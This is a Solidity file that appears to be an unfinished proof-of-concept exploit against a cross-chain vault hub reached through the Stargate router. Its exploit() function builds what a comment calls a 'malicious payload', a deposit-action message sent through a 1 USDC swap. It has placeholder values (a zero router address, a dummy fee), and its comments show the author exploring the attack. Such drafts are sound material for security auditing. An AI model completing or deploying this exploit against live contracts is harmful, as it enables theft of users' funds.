/// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "@interfaces/IStargateRouter.sol";
import "@interfaces/IHubPayload.sol";

struct RouterPayload {
    uint16 dstChainId;
    uint256 srcPoolId;
    uint256 dstPoolId;
    address payable refundAddress;
    uint256 amountLD;
    uint256 minAmountLD;
    IStargateRouter.lzTxObj lzTxParams;
    bytes to;
    bytes payload;
}

/**
 * To craft the exploit we need to first make sure we clear a few things:
 *
 * Prep (reaching the contract)
 * - I need to go through the stargate router, possibly by swapping 1 usdc
 * -
 */
contract UnknownCaller {
    address destinationAddress;
    uint16 destinationChainId;

    /// STARGATE ACTION::Enter into a vault
    uint8 public constant DEPOSIT_ACTION = 86;

    /// STARGATE ACTION::Send funds back to origin chain after a batch burn
    uint8 public constant FINALIZE_WITHDRAW_ACTION = 87;

    function exploit() external {
        // connect to the router
        IStargateRouter router = IStargateRouter(address(0));

        // create the malicious payload
        RouterPayload memory attack = createAttackPayload();

        // compute the fee
        (uint256 estFee,) = (1, 2);

        // call swap
        router.swap{value: estFee}(
            attack.dstChainId,
            attack.srcPoolId,
            attack.dstPoolId,
            attack.refundAddress,
            attack.amountLD,
            attack.minAmountLD,
            attack.lzTxParams,
            attack.to,
            attack.payload
        );
    }

    function createAttackPayload() internal returns (RouterPayload memory) {
        // can we overflow the action? Sure but it does't help

        IHubPayload.Message memory payload = IHubPayload.Message({action: DEPOSIT_ACTION, payload: bytes("")});

        // we can set min, strategy and vault

        // strategy

        // min:
        // is only used in a require block, I'd argue we don't even need it...

        return RouterPayload({
            amountLD: 1e6, // 1 USDC
            srcPoolId: 1,
            dstPoolId: 1,
            minAmountLD: 1e5,
            to: abi.encodePacked(destinationAddress),
            dstChainId: destinationChainId,
            refundAddress: payable(msg.sender),
            lzTxParams: IStargateRouter.lzTxObj({
                dstGasForCall: 200_000,
                dstNativeAmount: 0,
                dstNativeAddr: abi.encodePacked(address(0)) // this could be interesting
            }),
            payload: abi.encode(payload)
        });
    }
}
